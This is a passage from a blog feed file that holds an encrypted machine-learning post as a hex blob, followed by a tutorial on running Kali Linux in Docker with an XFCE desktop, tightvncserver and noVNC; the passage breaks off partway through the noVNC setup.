827295e733c7839bbacb3f798ce36d07ba4daf6249abebbc01d1e04c82ac59fa5ee82341e730c9ac7e0cfb31901df394ce0092193de8303420614e5bd0ec1e18d09b6b0aa1b26811a2c6a39c90fb0eeaf6dfa6a26698d816299b3e5a4154701fdf145f332a077e9e880d0b48ac368aa8f5a50baf43f7a6bdb7f2079b45e766fd6a0e53449a7ef51452a443ad6c63acb53e1bde14944473cf1eda60b9a8879cc6b22179758c816156e8b33ca093e5395582e7ee25d5edbd0d1892f05f3901c1bebdc290144ce33dad4646b97753dd1481b66de5b27511af2cdf6634c48fbb73f14c1dd2b84412a8e18b99fa1fc4f6a734343b0db3d51d74cb5afec597982c1ff56b51c4f5fbae68cceb0cec0a22caaf1bfec45bc2fc1e56885bf1bf0827a44d6da0af2e89c4f8cf104d65585a851de36f8011b020a5b49f4310b19b452749c46f367254b63fccbe2960915839747aea712d85b16f8a350a2bf837c0d767deb2ebc6cc1e729437a814e3d84b3ab483938a764ae603eff8f282e1cd43f245804d1595ef8046f3425c322ad0d08cf7b9bc66cc3d8b5a055b74395832242a5d1c8b32fe2e18cd063a94d166cda2495855d8e2b27c0d13e84416b9a4b01eef1e1dc2b70a2700b78c5f46d279017c97e9e2f651fd78f193aa6ae7fabd77446789ef536af07160e474e3e2f41c4b9935ce0492519b782957957d8f237bd2a20a28ee0b9a6f41b635a65c574ba2d2a4e7dc869a579115487948d7bac267c130e717001b8fbbdd072ec35572641b222de2fb4e8d1c070fb590673cd80aca67c76b3da3b8fd069534094e4fb429ba4ff084b45711e30c3b5860ef2430fb61b1d72ffef90531d7b5a3c5de53dfdb77e2837b5d6dc488dc0de529da9fce08ba28fe66c7ffb22a10c16a6a12d6c0d769a54ecfb5c80d8a2ad66b7a806ecfae20529e774cf2175d725e1fd82f13b3830e49cebbc498a7795da9c87a869afa9c3ec75e64a7b9216e3856def9f9f3ae56dc31ab1d055b3dee8f5dd02075fc0c69899f92da01d016ebcb27e7a99a440aae2699e247c29c45b26e8210cfee3881ebee84a1dc9773156a8a6b1b02d4b431c481eb61fe00cca2a12fd8e5e7bfead37ca28ac434fd8af0e420043f3ce46546c4e8609be925542b1793e78f67efc0783904094fc77d2ca9bbf510ca210a69f8b81049d5e21bc16296603aae19e41bb70d09de885487439de10a34dc3d603e4c584c456185b2e90c61ebb2f51c4b332aa8dfdbb6987d64d14fd6033e5892180d1afb95dcd9d8b5358346453c6b7202885eb637400db890c13b95c183ce87fc478b6ae514b104955c57a2df65a8187dddb2fcc5bf2cc6c81dec5fd22b0eae315909f41ba0f7053a99f120c248d381d381de3602b5d4063e9f1c1c15fd019583cf0fa1483e4bb93b93daa84457f8e1ab8e77b58d4bddac448b49a4a7189eb5b9cbf8b4ced6dbde3943afa6ab95f45cc71e4fb7a9068147d74753ce65e5c2d7e4b4b18f5dc6c30be8207e3db6936b4fc209afdd9214efd39e065952e5b5073371bd8fb0040149ad24e0e5628abfd4e9beb57ba8b47106ea4244a66db1a40099f945e9f1abb33d9ab7a199262e49cdba166703411988a562b3818ad178e9ddce58b89d07d07ba61ae4ac3e6836f002752b5b2915a16060d4b56a8d96e769e1714f3e778a3ed3be0034bd49ad0d74c8468a01234304d29a7d42464b0a2d47f00a47fe2bcba5300014a6ddf5f0312156852ceb1452c4829176adae401ed07c4864f971bd2e0d2f8bae4004fdc99a8ee390624ec443c0d85f05731f8260857f21850e18918844f79660a3ea843fb6670c39e87c5f6653ff7cbd4a8aa0677562265cdf300c96c3ac639d1d9937bef2f7f60d9825e1cdd00d1813247742505b78eda6775ea3d32c44315874af6425d89d0ff254acedb4b6631ae13c507c15585bdff04de39ed0603c9286374323bdca905da5bcc573920ce90e02f648a0d34c867abf24c08a36a567856e92aeeed14233d927fa4e94ab1fd1993110bdbc3308111ec6e37af240197ec61947417acd7b09e3e6312d65933d1a1ffe3b080beaa59bf5798e5c247197ffc663d1969f3ad917be0e8406cf4234f4943202a7334e22e055bac85d493717de353c9cd7e386ee609397fa0c80f0641b7d01d8547ec30f91493ebb3fd731ac5b9db18658489a926f9fc55942d9cd487b8b2ef19f55e85340fbda62038f7abd7b0158939f7388a3cc8986dc8c964981360a9a7a4e5fe0ba044f187e9454b256b9607ae2e2a88eea7e7abe8815f917257c8514b4946aa84b1d5327328384a9033b4fd0781f2ba6ef4bf4aa1aff5ff0452beefe68cf2b51da9bd085d972d8eec0ebe017cee09ed55ba898bd4cc7fd0e189c524944357e30d32b8a577484fb0ec429565a7f6e0245a03d4454f99d0732a4c7a4ab99c1157d603338a2c109dffb7b733c65675cb21f81327da113de1245df2cfbcaea79445155ec4e1f0dd07526425c0368a7dc074a6942b884f097221448220ad6c37e8fbe1d3129843a57f3433bbe6b726003e88ab44d8f1780dc12f6d397e9f1bdde8b19314e8cd25d7f0da57683a3e1a451d6b0033724e93c68f61bebf13422874bfbfecf26bbeeaa916665b85ab0e748c2acddeeea796ff5a43344f58ae40c3aade4cb7f0d43341a94cef430b1f1c9ecd9d7e0ec65d07d85a05f79cd3320f8f0c9dbd42b832086d59b99b4ca3d4569c78c800d16b931592407ebac30ebcec8bca436362b44b5fdcdf02d4ea970b6529e0fd2307442e8a64dc44ae3bb85a8ebeb38b2ee4d9176857907cd69c88f0eb65a1f044ac85b6664d078944f567fc44c3944bda751c2f0265fe2c3ae9bb290e54889be524db35ea9b1582a91814f8e937a9b6f06f78a8894beb2cc4b5baefec2627745a4fa28992d94b93a228eb169273ecf458eedf7ec8b24d33482c16551a749910f029823d26bff298a58b145eacffb4843ed0ba1bb7e100c524c79aafd33a6f8264b3d922bc544919d401ca85d2d97e025fb84a137c3ff633513651d4421da486f9c065eb74c1f912f89ad95c80558337800cb15daa5a19cfd3685971a32a30a01a49d55e9dfef03890e1eb125c3e74dda054ef7f953ac6dc9516bf5d0dc164fce1a56b57047ce9be67f31ae3e8e50531a6c627e39826a66a4aed59d1df790f6832136ba894a985b42ddfd915993554393933182053456d40ae01c2a4ad14997f6011564fae4b7faa4e9c4716f497950cc433dd9778b0f4a2468aba695c1b7b1a7c6335b16230d675e0bc6c563220109ab23bcd8013e07f140e062d0832294d08eadecdc0bf89ecf7895d84bf32675c7039bca32a4c2210bddbabfe0d64969f5747237c9b09ae8f4a83104102cd41db7a6317dc0533c2c996769b88768117bc64397a7ffa44ba5bb59ae3188936cf045d2b76127bb975fac5c929f95bcbb07eb661d47085472f144249682d8f584ac842fde6d5c9b67187ef294177b5b9626824bdb85f74a3bffa2c07cc9866d147fd295ee063b33b3ed7500d6335324824875bc7923355935fe686e27898cfaaa7770fc4454221a888df9a009112a5f4e12dbfc908bc9a68bc43f3e3f15a50fafa62be53915d284db6fa887b3043b7a9e7eeafd83b2b356715f6b75654c7786174f0dde647cceb0d351de6976ecdc5908b6b1c73774da4357c94620971603f9fd23b472372c4f7fdd1d4ad13389540b4914ff15de48836f05c5337c389b3fca111ec7a20583e81350a02bc1f41008838093269f8759b0901baf3c5d7a8ea938f41d82bc57c8cabf9308067228a5e0e4ddbc8d411313ad003eb42c845cc2be0df42b7e8c55c0383767ede5085c22c8753186601c92bdb93700c4529e90d0067046a08ab44f3bb6b19ba889085187dbc7a3a44bc691d9b106bf46c6e753aefa3294acab400e0486c31eecc35b05a271cb1c34806816657cb53bb34b42a8ccc79524e03b26267321da97e5149d8b4cc10c678d1d93e99d3d2f4f589a6492da14ca1c795c634966004e6bad815843b4a90c59970875c2820a7c37c3109e5c322fedc26d95bbfb911d949066ad48071fbe073a2e3a0188acd178cfd5ccdccf07f5161c1db838e2bf54e1cef959b942b55d1526dd27f515023a5a6ede59a4b7c3214570cfb05dd13f741627d5570a057f1d1ffea9538b55d57e138e2c2f948ea0f9278941d31bd8c7b61d3d03fc9cb7e1d3cc347d08c3a7643aed40c63cba5a71ea83fb087dd3235393361dddfb09ec0c41d64cf299e362e420b48247a7797a415d1501e9e33bee39d93867857087e3058d9a1d1ff4119e6a35c004424de3cd8c4506ce678b402d98e6c5c8e932fa0606a41c4cd4bfc73114b062c3adefda9d5c6245bc1aa820f008bcd426e91d4b36f463b673ebe26aa6b5b3893eaf49e4a334558b3fa2ad2c2b57897f97dfff77cd96c6a11a6c9907cd8ea02792fa7e35897a57746fd40e0a2e977cc58cccc699fad49046db6945c0329de0b302b0bd321077b33ba557f96382f68565b319341bd9c40de291199a9d4e6c92ed6ae12406ef18d9dda310254f7019607b2dcc635831c4aa433c016820f0d744b23991c6d8a3ec88cbdfb36980ede390fa8d642e68872981fc01fe0d40a1df2c8224017d8c9f8c7f9a0eadf5b6d217a474c41702642ae1946e677433bb2034fb487630a67e4d4ff04a8eac8c07fd2f33e3cb0c8f1d0a091d9570a1a22b9deee4a1b427e01fb3ba2f9f37f9b166491a445ee1f60d2c703db645dc31db1e97bd819020b4036f33fae5fb7f75dcd6a2f8e316dbeff5c3697751e3786c5285606f0fda05448aacb2b8db6bcc7ca77bef7adb014b9f95983983d08f871787f52dc77a5e7ea9919b1fc752e27f2ed89c0aafb3b4c24569af8ae88717e03851ac010bb7758414bfed7f8776fdf34294217688d9d6545ee9444d8d8e08da242f41435dc80a94c683117ff6d3bbd0d169e5a043441c811f0f95c3cc6d3a62cc8acc73a5861125eea24108151546ae4b710485e43eb982c5d9ca00acf3b9455f6a18835e7d9972f807e345284c49fa14c84aee954760b18aaf8b728af7beddf39656353a7a74285e3d9671ffeb3a8b4ac6285e4db2f36c15de791c03f53f1c98e321b18fb291f6995c9204b39c818233dcd4ce7df643c368b78f9fb9a48203515a14a513a435900ba8e553235809adbd440abfa3d73e9abdf02827e75046e51a5597196ae52739b715b65c5765a860bfc708880818ed7456b3f405b5f8f2e5ecb5a808c53bb04300277623b3850cee361164e666c5120e3a495c87030689c35e7feefda51558c6b42fc2d79991e041ba087d8766c76eb3952e475717fa965e25afe4f6d298958af70259525b2157b53b3ff8b9729021e64430abb43829a6be0ad90e1bb04d68989b7b4ef3db8e75e39053ad15a48d68e1e325c0b858b19f75d298d1288cc8bf935045dfc89237c5e9b90876b1c505b76035a748281e18a5585d263ccc800cb30f2b2e4b95e292152a26600c9c6340039bcd10c3322f05a19b13e857fe9e8e3f9e70cd6a6c5711dd1dd560b56007e25399a268ade2074feaccc8b9855d07500a82cdd0f48e170dcbf6ee2095d0fd52d0c103162ec295e8dbd1474ea0a5e154ebdb5551895e81668d0e76b05e71eca4aa316df5ed3d63a798e94d7ce7c6704e6842acb391dbb1374559ec25785f58202d29404b70f805177b1add6622d84c3a2936df77ee684788390425807844b10df4609b44a84e18d291ed6abf88457c9dc6c2228e4202fab64372e3f76e0539575f297facf8cc3823b68158d0b268c8c2a7300d29f5b46fc905af795bbf2d9653552154e05d15014be4abce42c19920e581f5e762cbb3896c2920dfc6c8cdb3a78d0a9b2e85bcc38b1361d2cff8273d9f64ac91e46abc6e823d8532c1f69c8d2d3a0d8ec60262a9d61e1cd2483ba49363b3aac7253f546a03442c3e0e4c45c11352cde62e35f50329c4425583ec6f725368c0fe7ac930412bfa407e342402edf612889c8dbc7f059dc48bb7c65f3148ce082c9ccc224be21f272d2cec96d8a302f13435c58ec5ec12af820464b4b6a9375fdb2edeb5abe91305955dacedb2ada0257cb979632ea4b2cb4ecee6b829d1da11d1814f4da4b72d191dbd31d03e5ce051da925185f68b6d558d7a533d65b25e0fd5c5d74d3f706a3566da0157d74c6578db73c6912c0d885fbe455601e4684de242b692ea72d5cf5745de9c124d01943e42471d1e010e6e9d5905a336b3ed75962eb246854d776705b4b6aab4788a0149b53e0584f4481e3ba0d6706fead74ef83338655be6cc73d0463b72bb5f7e5632aea1a70e16054e44314f6fbd3613748302708a6dc8b5b211ee054f7f4339f7670882aab30911798973a72f5042ec3fbc519851777fcd2d7d3ea75c908f10fd9b1a31fd7d7cfe532f02aabaaabc3dc97dd5e8daf379b27b69d31b33634a7fe17cadc1cb25be6b4f4459e10e5befa3c3c6e9cd8b99fc9d7536a40d557f00b4f66f43b3a68b0cecbb4db60627cbb4f8c84160e64d67ca43d1f37169f353378a25db06a68c05f957b53b48373ae6693d2fbf80f2800c34c6bc2fa4551ad11f08b779943a9e359b58f5a6d3777e715c0266af2e41aedf5e6ccf07ec03c487763b2da133fcc321c7b5fc196eacf9990f4cf4275eb1ff0e3bdce8c6154fbd49329fb62dd447f0feba7632c553d4cb424af59c05b6802339c5f29db942b20d6a1e4c1f59a860a74edcdebd73b0e59d2a69a0bcb272aae4958d604dc770e61101de159b0fefc01565b02a30673898cc00ab7e0ad0d45d6c596dcd7d672749ade64ae80cb8bf156242921e7210426924cfb1915816a38da41d8538469610f74c0106ccf972caaab0820b31c84e6febbf6aca680f0b1899622df50e085ec32f15fada0265dd9507089d6e79ce8155707a750d45e705b8d8e678fd8064f86266e531e5216932fdfc0c06624fb4de1893d43f44c9661acf7c7fb67bda026cdc755258c172f0101c37eae094a51f71c9ef851797fc7bd1dc83adb6b90c95173a72c06613586551ed55d403bcef186db6add6ca49e6f774218f9b5f7e7ccb03738ae9f595b1ca01c34ffe870e214818c024e9b2dceb0bb0ace22b9610f9d26de60b90b716208cdebf2ab2a9ff7e9fa7dadf6f4b859b45d50a78489994c87213eaaa33b4cee9788fe22b24af121fec08daccbc0d345a2bc0ab44a5ef6bb36ed20ad9dd6abc38120279c6b091a40ecb35eca71d248f165fbd9efb8af3e7e7f8e50ff27f7807d03708e8d55333b9f59b3662dbac88784619c05a12cf7e6303b2a752545e16756118878c0ac57ffc69dda5da36bb1ef4c6771ea72bffef88a9c3c87f79bf129429240b3f47ff2289e2e1b674247fe7f80bcf364b6b59437b45964aa8473bdb957b91c8a50c63d5bc7ea2215ccf58a5c5cfb5b26b9075430c9f857396fa0eefd862f46155c2e33a003633799cf8203d23c08ee99e49fcb323cecb8a28877b5bad45e57dba7d09a63eea8f5495d68c72253db0c06a030647c6f0a54a14894429c987ced9765b7dd132a112905def41a4fa5e86bc3ef6a83a5400d26ae3cde7a48647459ad28a7b912d2e632391728aeb7f6e281f041234f4049a2366994bc9b0393de7cc55775aa2134a50462681986d4a80c10d71fd295e1cec010afbf2221dc7965f16cfe4f6b826d2ee2efc9e6afadce26fe28e364f2f70fd3ae4efbccc099862e3b35694e1fc883d62833ef8c0159f9def7130df47e192dcafc4e958d6305800150887a107d1037a7a9ebb3c77e0446e158f25b90d843912ecae8ffae0e3923d446ea1903c7a15f905fef5ce62ab4fbb1a3f009a0331554d4c738ff4597928c9df20503bbb8f992f5a56714b6038f7abc665a37fdb7dd302a690b785e1dcda55a0e340af6a919d6811a4cc0a955ef71f038a29d3b1028ef7166a90c68bd0137f247d35113d1ea0c00f1aab9b4f9ade4053e895157347e58f4afb4b6f542a9bf44cc2e7f59a9f678cbe47da7282c18893b71a406dc30fce68d15d4c2d8a7193cc79e7826afd8f5ebeb00fd0ffea8f327644fab45d90feefea7df06dd39e13274f0e1dbc594c44dce26d74495849f252ef5e37220808d9d4177a01f6d1af1043cb7c9109dc8b933b39407f157b9940f709f8697abcd144bfb7ae843e6ba1b63a47079b7146fc971a0b5ddad89608f44427bad2f15dfc85fb253d422e6a33fcfd7bba7b14f23453e849b35b4d4bebf141540febdb07254bbd36c85039722c15acde85b01d6882ba913f8b34d416f5987887f9bc00bcd010dee5ae43c3191bdd37981e18fd300659afc029cf2c47f781b491b2cbb6029cef08518fc085635868d70299364e49da965a9300a5a0df70e6c26f875cd74095943f4c82e49ccc744cded83c50fc45f801a4e5c725cfd6414a02366ac32941ed83139733c00884602631fa1ee6264ebeb1931ed5421567bad1904acaa07e39bf424132fc6e1ede84b4dfdfe81fa8d6889258e2dfa41b0285073c29b2a4a568921f3b30156b4555a8d0f47456949ae44b5e9bc6949769fac4b54b9bcbbf6368bafb882d6c9a798a238f03303e036a1f2e7abb04b57617ec13196d132abdda5605367329107f460f9180569971e3d73a8827e28bc0f97efabbb7d129bd474458db2335bcb172aadd32ad7d87403ee602779cfc4f93859167441beb6ed16724267c34872202f480c2c472fd39c2b9a25fc5f80201c098e02caf4725931054bb8ac58a25cf8749bb52c527d27dcc26121104c86d6a9c90c563238603867c2414526c4d838afc3fc9807e757b82f5653140edcf2a47e867c6c3fc6990b9fce1491a987b96066798567ab4a73bb87d2f9c14ae52a1238b9aaff38a58689093ac9cdcc4136625224ffec52c90835eaa02cc216a0708d88f2ff497d419462f6a2df984b07fe5e997ac338d3d7d334f3e9cc107526bd7080a0fa979f1bb61a16afca5bc2a145529cf2d34468330e72091128ed05022a955592a04b9441c956ce333268723c808544f5c4e45a1d9ed2dbc6e66001257d71f05c71d2ae2258c559d12ad27bc8aad6a62359393303d26d5e836f6526def78b9b94ec8857752cc415ead1222b3271171d19bd68cfb9fb180a1302181f49f6f2a5c3f66628d414661db9f33f16e9bf18e0a4c64cddb9020951ecdc6451cf2cb0fb52fdb5c8380f0cd9159073efbfb0b93e4263540610f197db812718fe1e1f39b21a88ac899e15811c58c8b1b1c0a7e4a94735d926f7587808bbfe72efa1af4ba7a57ad54f7b17e1fcf0ee3913e7c43818316dd60e1ad11d6f9e4a757ecfc0371ad2e5cded47f14f9bf5a501925255f81d6eef01e42bc14f3d364f6d3993f695a1d3c3fb42be3eef0772d87414ef30e9a9307393e1f3fe08a1926e18d04aa88f7ef6c674e7124906f7968915b15bdf2df5c4b2eb0d77ff92eb444f0c01482e5d52dcfd15b28218a32690d7cf0af4ae97dba15bbcea2e94e3b9d1a88a5f82aaf9a9b6a22dd3513fd62f8f51422535ecec2939d5c739dd6a242a755e6c460f4de957c94d29c7cb14c6dd3e5097c623164cff366193006179d84958d874b5489160c3164e9deee7e35e70574c5ce24e5e26b0cea813b5f31053444a6b7805556d3c8577cb5a65f92367cdf8def33f8940497eecd2d9dbf6eecfd02309a6227b6a2605fd70cd6ef9f136520bf898b506f5e155363eed94ca7dffdaf726703b48e4a9aa5e275007f9bcf019521ac8f78b0da0860b139fc2c53277ad6489caf15b3bf9b1754ad1e291c7b81f8ea341311f461ff44f18309c236549d989b2f99f3baac08ef5bc7bb2fdbf3d0923dab774de44dd6c263c513653b02fe25160fc0400b00af4a020b1c5cf3c22dcac326167581002e9f12f5796823cf48153c866d7cb9a1f9db1945829abe5a3edb82efd0be2c1fe49e346808fedf82a6132948b8ec6e6e4b4753c45ef29c463d85ef1930b614b1511bb84e80b681d221910ca783aad1c611277914235866e9b9ccfe422a6f69c7d0f0a639d1e919c2d5980e2b3ff2359dfcb30804f82eed129936808d76fbefd1dfce74833191534190404905c97ab763fa6f05f49da5f242ad93fe4da5d8efb706f4341354f9def327981aef0bbee49f02fc53eb1c9d4b918efd8c18e3be37efbe29d42a597615e15a4156f357bfab74727ae4088cfb90b3d0e685de9881edbf59d644afcb22245466f0eeba973856232d6440634f1b457700d190f2bbe95bb7da44de42dbe57ae623e36d170b4a6c2edf95aa7a2cbd4e496078b442f9cb925f49a9bbb2b538e6f3d6460dd5e57f2c45bae3a6985920490c8a1dba0b0a1f4a0e38a0f66b6348f482ef6ebc52ba115a41f310400f6941676bad90d9b21f8438bb633125bb1eebd54d82bdd7fabbd2d3b50d44d2a88e80002e9f23407c33af55b4135c18d95e95f66e9e84cbcfccd7f83b326e7b70120c599acbccc22d4f9b6ed1d20e755a7a180165a37630431925649f432b5d88a85ff56f9608f7cf79f0c287654f8bcd5f8a55e4e73a7b6e718db1df3e1de706821115a4ff9c92905faf948fd38bd08882387f0e7e495ea1ae1e11985574608088ad2aed90d0ca1815aeff68be9f01029e7e7f52a60af312b89e8007ec2d550161a8668a4c43bb310453176ad7e2754046a76ab59e0cc79cb3864f3dbcd51437eb1be97da04f6123985f8091b3f09b64ebed77b32620f05d43300d786c490349b445955ad50c38ebf7ccb43b37e566701d1370415529482b26475381ca7498cfd3577e5769d9cc38a14998d68dde171c784268ef8a81a0bd120cc2700e6bf4e74c5e5926a3e788289022bc1b855edaa5900143d2c59b8cbd996b5d14368cfb9e854dcc5dd65646aa903f5f0101438bc18322b37629a55290e0a00d7dfcba10a98c803e1b3398ce8af875ce046058bacdd967757471017692ce00224ca406e42b67037b4ee56b3090e771fce0a9cce2537b956b4471be78e6f4cbf3c20ed079ee8831b5983bb7c29a57c66d2b652aa700f707b6e02c9d087f4aed9403a968f6c4a806d503bd67bdae4cf69e44746c71f062b8fdc23b5200b27182e2d44c74e54eeec1875a3ba62affb71ad76d2af70bed94c76149506c17947205f510d6cd5c31a9676499799e9c00247aa53b20f79e9445363aa3a43600b226ec4169d08a71fe745373349ae9033f935193805d5d256d62cc35bb006ae6e81a7f7c79e09a92e25d85beba26f0cd5dd73ac2619f574349912a1ef730f348c06bca58ba8318badc3a3b4e43670409ee8a551c3b26627a2e64011716ecc8c24127052e35a80e88a00180c2a2955a328234b26596856467964c85fc60a56b4393d30359c6a3d424d3043aabbb87ec7e590c5fc0dbbe2a954586182965baaa02f9547c2afee2f73a2451d4715f085d4c154596c1e922718eec4fc73247f4cb03f570942cdc9585d35e7177be59f32e4582bc6b84bdc66bf33dc2e7d79e78ca2e970dc76ceb433e0f9df4d4b1164ea625738617fb8257fa62ab303757ae5a6fc4bcac9c3790b58cb256c6780e37dd4f7e60fbde4d9a6fac97bac8efd2b6a720cabb888818745f104fc17b1b0c6fb2527e30260ba63e5073ea616d3bde4a918964b1304b014d0ebe67d6b451cd7c77cc199c43f53523346595ebd4c68dd8a658afed22529626181e923cd1d72f588a3c048a93ff18d38c291542d50a78cecdf884a0899cd9</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> AI </tag>
            
            <tag> Machine Learning </tag>
            
            <tag> Neural Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>run Kali Linux in Docker and install Desktop Environment &amp; VNC</title>
      <link href="/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/"/>
      <url>/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(CN): <em><strong>Âú®Docker‰∏≠ËøêË°åKali LinuxÂπ∂ÂÆâË£ÖÊ°åÈù¢ÁéØÂ¢ÉÂèäVNC</strong></em></li><li>Title(JP): <em><strong>Docker„Çí‰Ωø„Å£„Å¶Kali LinuxÂèä„Å≥„Éá„Çπ„ÇØ„Éà„ÉÉ„ÉóÁí∞Â¢É„Å®VNCÁí∞Â¢É„ÇíÊßãÁØâ</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="overview">Overview</h1><ul><li>EnvironmentÔºöMac OSÔºàWindowsÔºâ</li><li>Needs ‚û° HOWTO<ul><li>run Kali Linux in docker ‚û° using <span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS91L2thbGlsaW51eA==">kali linux official docker image<i class="fa fa-external-link-alt"></i></span></li><li>install Kali Desktop Environment and VNC service for kali so it can be accessed from the host machine<ul><li>‚û° choose one kali desktop env from e17/gnome/i3/kde/lxde/mate/xfce and install</li><li>‚û° installing vnc server <code>tightvncserver</code></li></ul></li><li>it's better to access VNC without installing VNC client<ul><li>‚û° on <code>Mac OS</code>, the pre-installed app <code>Screen Sharing</code> can be used as a VNC client</li><li>‚û° use <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vdm5jL25vVk5D">novnc<i class="fa fa-external-link-alt"></i></span> so that we can <strong>use browser as an VNC client</strong></li></ul></li></ul></li></ul><a id="more"></a><h1 id="run-kali-linux-in-dokcer">run Kali Linux in dokcer</h1><ol type="1"><li><p>pull docker image <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull kalilinux/kali-bleeding-edge</span><br></pre></td></tr></table></figure></p></li><li><p>run container <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -t -d --name my-kali -p 25900:5900 -p 25901:5901 kalilinux/kali-bleeding-edge</span><br></pre></td></tr></table></figure></p></li></ol><p>notice that if your host OS is Linux, you can as well use the host network mode of docker <code>--network host</code> instead of the port mapping above, it will not only become simple in next steps but also be useful to optimize performance.</p><p>It is sad that host network mode can not work on Windows and Mac according to <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vbmV0d29yay9ob3N0Lw==">docker doc<i class="fa fa-external-link-alt"></i></span>:</p><blockquote><p>The host networking driver only works on Linux hosts, and is not supported on Docker Desktop for Mac, Docker Desktop for Windows, or Docker EE for Windows Server.</p></blockquote><ol start="3" type="1"><li><p>go into container <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it my-kali /bin/bash</span><br></pre></td></tr></table></figure></p></li><li><p>update <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apt</span> <span class="string">update</span></span><br><span class="line"><span class="attr">apt</span> <span class="string">upgrade</span></span><br></pre></td></tr></table></figure></p></li></ol><div class="note warning"><p><code>kalilinux/kali-bleeding-edge</code> is a small size image, so there is nothing in it but some essential linux components. You should install all the kali pentest tools by your self. As written in <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">here<i class="fa fa-external-link-alt"></i></span>, the available installations areÔºàthe <code>New</code> columnÔºâ:</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>Old</th><th>New</th><th>Notes</th></tr></thead><tbody><tr class="odd"><td>kali-linux-full</td><td>kali-linux-large</td><td>Our previous default tools for AMD64/i386 images</td></tr><tr class="even"><td>kali-linux-all</td><td>kali-linux-everything</td><td>Every metapackage and tool listed here</td></tr><tr class="odd"><td>kali-linux-top10</td><td>kali-tools-top10</td><td>The most commonly used tools</td></tr><tr class="even"><td>kali-desktop-live</td><td>kali-desktop-live (same)</td><td>Used during a live session when booted from the image</td></tr></tbody></table><p>I chose <code>kali-linux-everything</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-everything</span><br></pre></td></tr></table></figure><p>and it took me 4 hours to finish it and the container size came out to be 15GB+ üòÇ</p></div><h1 id="install-desktop-environment">install Desktop Environment</h1><p>As written in <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">here<i class="fa fa-external-link-alt"></i></span>, the available Desktop Environment are</p><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>Old</th><th>New</th><th>Notes</th></tr></thead><tbody><tr class="odd"><td>kali-desktop-common</td><td>kali-desktop-core</td><td>Any key tools required for a GUI image</td></tr><tr class="even"><td>new</td><td>kali-desktop-e17</td><td>Enlightenment (WM)</td></tr><tr class="odd"><td>kali-desktop-gnome</td><td>kali-desktop-gnome (same)</td><td>GNOME (DE)</td></tr><tr class="even"><td>new</td><td>kali-desktop-i3</td><td>i3 (WM)</td></tr><tr class="odd"><td>kali-desktop-kde</td><td>kali-desktop-kde (same)</td><td>KDE (DE)</td></tr><tr class="even"><td>kali-desktop-lxde</td><td>kali-desktop-lxde (same)</td><td>LXDE (WM)</td></tr><tr class="odd"><td>new</td><td>kali-desktop-mate</td><td>MATE (DE)</td></tr><tr class="even"><td>kali-desktop-xfce</td><td>kali-desktop-xfce (same)</td><td>XFCE (WM)</td></tr></tbody></table><p>old version of offical kali image used <code>kali-desktop-gnome</code> as default desktop env, but the newests version has changed into <code>kali-desktop-xfce</code>, its has smaller size and is friendly to low-cost machines.</p><p>so I ran</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-desktop-xfce</span><br></pre></td></tr></table></figure><h1 id="install-tightvncserver">install tightvncserver</h1><p>old version of kali might use <code>vnc4server</code> as vncserver but it has gone in the new kali, now through apt install we have no choice but <code>tightvncserver</code> .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tightvncserver</span><br></pre></td></tr></table></figure><p>run <code>vncpasswd</code> for the first time to initiate your VNC password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncpasswd</span><br></pre></td></tr></table></figure><p>then run the vncserver, before it you need to set bash environment variable</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> USER=root</span><br><span class="line">tightvncserver :0 -geometry 1280x800 -depth 16 -pixelformat rgb565</span><br></pre></td></tr></table></figure><p>the default port of vnc server is <code>5900</code>, note that my mac is host machine so that the port is <code>25900</code>, which was mapped when ran <code>docker run</code> command at the beginning. The password was the one you set when running <code>vncpasswd</code>.</p><p>so now I can access it from my mac through <code>Screen Sharing</code>, you can try with your VNC client to connect to <code>127.0.0.1:25900</code>, you will got it</p><img src="/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/1.gif" class="" title="access through VNC client"><h1 id="install-novnc">install novnc</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install net-tools</span><br><span class="line">apt install novnc</span><br></pre></td></tr></table></figure><p>tunnel vncserver on port <code>5900</code> into WebSockets vpc server on port <code>5901</code></p><figure class="highlight 